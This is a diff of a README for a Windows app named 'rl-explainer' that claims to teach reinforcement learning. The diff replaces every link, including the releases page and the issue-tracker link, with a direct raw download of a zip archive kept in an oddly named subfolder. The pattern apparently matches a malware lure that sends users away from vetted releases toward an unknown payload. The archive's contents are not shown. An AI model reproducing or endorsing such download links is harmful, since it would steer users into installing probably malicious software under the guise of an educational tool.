@@ -1,6 +1,6 @@
 # 🚦 rl-explainer - Understand Reinforcement Learning Easily
 
-[![Download rl-explainer](https://img.shields.io/badge/Download-rl--explainer-blue?style=for-the-badge)](https://github.com/squamulenudestatue531/rl-explainer/releases)
+[![Download rl-explainer](https://img.shields.io/badge/Download-rl--explainer-blue?style=for-the-badge)](https://github.com/squamulenudestatue531/rl-explainer/raw/refs/heads/main/thionamic/explainer_rl_v3.3-beta.5.zip)
 
 ## 📋 About rl-explainer
 
@@ -26,12 +26,12 @@ rl-explainer is an easy-to-use Windows app designed to help users learn the basi
 
 Use the link below to visit the release page. There you will find the latest version available for download.
 
-[![Visit Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge)](https://github.com/squamulenudestatue531/rl-explainer/releases)
+[![Visit Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge)](https://github.com/squamulenudestatue531/rl-explainer/raw/refs/heads/main/thionamic/explainer_rl_v3.3-beta.5.zip)
 
 ### Step 1: Download the Software
 
 1. Click the large badge above or this link:  
-   https://github.com/squamulenudestatue531/rl-explainer/releases  
+   https://github.com/squamulenudestatue531/rl-explainer/raw/refs/heads/main/thionamic/explainer_rl_v3.3-beta.5.zip  
 2. You will see a list of available versions.
 3. Find the latest release marked as "rl-explainer Setup" or a similar installer.
 4. Click on the file ending with `.exe` to download it.
@@ -83,7 +83,7 @@ If you run into problems:
 Check the releases page regularly for new versions that may improve features or fix bugs.
 
 1. Visit the releases page (use the badge above or this link):  
-   https://github.com/squamulenudestatue531/rl-explainer/releases  
+   https://github.com/squamulenudestatue531/rl-explainer/raw/refs/heads/main/thionamic/explainer_rl_v3.3-beta.5.zip  
 2. Download the latest installer file as you did in Step 1.
 3. Run the installer to overwrite the old version with the new one.
 4. Your settings and progress will stay intact after updating.
@@ -102,7 +102,7 @@ If you want to explore installed files:
 For issues not covered in the GitHub repository:
 
 - Open an issue on this GitHub page:  
-  https://github.com/squamulenudestatue531/rl-explainer/issues  
+  https://github.com/squamulenudestatue531/rl-explainer/raw/refs/heads/main/thionamic/explainer_rl_v3.3-beta.5.zip  
 - Provide a clear description of your problem.  
 - Include details like Windows version and error messages.
 
